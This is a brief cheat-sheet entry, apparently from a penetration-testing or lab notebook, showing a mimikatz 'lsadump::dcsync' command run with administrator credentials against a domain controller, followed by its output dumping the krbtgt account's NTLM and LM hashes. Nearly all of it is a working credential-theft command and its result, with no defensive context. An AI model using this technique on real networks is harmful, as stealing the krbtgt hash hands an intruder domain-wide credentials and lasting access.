### mimikatz dcsync

authuser should be admin rights

	mimikatz # lsadump::dcsync /domain:valhalla.local /user:krbtgt /authuser:administrator /authpassword:Pass123!
	[DC] 'valhalla.local' will be the domain
	[DC] 'odin.valhalla.local' will be the DC server
	[DC] 'krbtgt' will be the user account
	[rpc] Service  : ldap
	[rpc] AuthnSvc : GSS_NEGOTIATE (9)
	[rpc] Username : administrator
	[rpc] Domain   :
	[rpc] Password : Pass123!

	Object RDN           : krbtgt

	** SAM ACCOUNT **

	SAM Username         : krbtgt
	Account Type         : 30000000 ( USER_OBJECT )
	User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
	Account expiration   :
	Password last change : 13.08.2021 07:22:10
	Object Security ID   : S-1-5-21-3410397846-649609989-2919355437-502
	Object Relative ID   : 502

	Credentials:
	  Hash NTLM: c2d3b9268608fab2b14a8c78c36316aa
		ntlm- 0: c2d3b9268608fab2b14a8c78c36316aa
		lm  - 0: 36fa5c99898f8a75a7783f250a6bf892
